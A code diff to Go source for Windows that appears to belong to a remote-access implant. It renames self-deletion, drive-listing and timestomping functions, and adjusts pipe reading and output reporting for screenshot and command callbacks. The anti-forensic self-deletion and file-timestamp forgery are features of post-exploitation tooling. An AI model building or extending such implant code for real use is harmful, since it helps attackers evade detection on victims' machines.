@@ -10,11 +10,12 @@ import (
 	"main/util"
 	"os"
 	"strings"
+	"time"
 	"unsafe"
 )
 
 // put some other windows function implement here temporary
-func DeleteSelf() {
+func DeleteSelfImpl() {
 	if config.DeleteSelf {
 		selfName, err := os.Executable()
 		if err != nil {
@@ -32,7 +33,7 @@ func DeleteSelf() {
 }
 
 // maybe need to be checked
-func listDrivesInner(b []byte) error {
+func listDrivesImpl(b []byte) error {
 	bitMask, err := windows.GetLogicalDrives()
 	if err != nil {
 		return err
@@ -52,7 +53,7 @@ func listDrivesInner(b []byte) error {
 	return nil
 }
 
-func TimeStompInner(b []byte) error {
+func TimeStompImpl(b []byte) error {
 	to, from, err := parseTimeStomp(b)
 	if err != nil {
 		return err
@@ -208,7 +209,9 @@ func loopRead(handle windows.Handle, hRPipe windows.Handle, sleepTime int, callb
 	}
 	finish := false
 	var buf []byte
+	var cnt = 0
 	for !finish {
+		cnt++
 		// process alterable(exit)
 		if event == windows.WAIT_OBJECT_0 {
 			finish = true
@@ -242,7 +245,9 @@ func loopRead(handle windows.Handle, hRPipe windows.Handle, sleepTime int, callb
 	case packet.CALLBACK_SCREENSHOT:
 		packet.PushResult(callbackType, buf[4:])
 	case packet.CALLBACK_OUTPUT:
-		packet.PushResult(callbackType, []byte("--------------------------output end--------------------------"))
+		if cnt > 1 {
+			packet.PushResult(callbackType, []byte("--------------------------output end--------------------------"))
+		}
 	}
 	return nil
 }
@@ -269,6 +274,9 @@ func readPipe(hRPipe windows.Handle) ([]byte, error) {
 			}
 			return buf[:bytesRead], nil
 		}
+	} else {
+		// no data available, sleep for a while
+		time.Sleep(1 * time.Second)
 	}
 	return nil, nil
 }
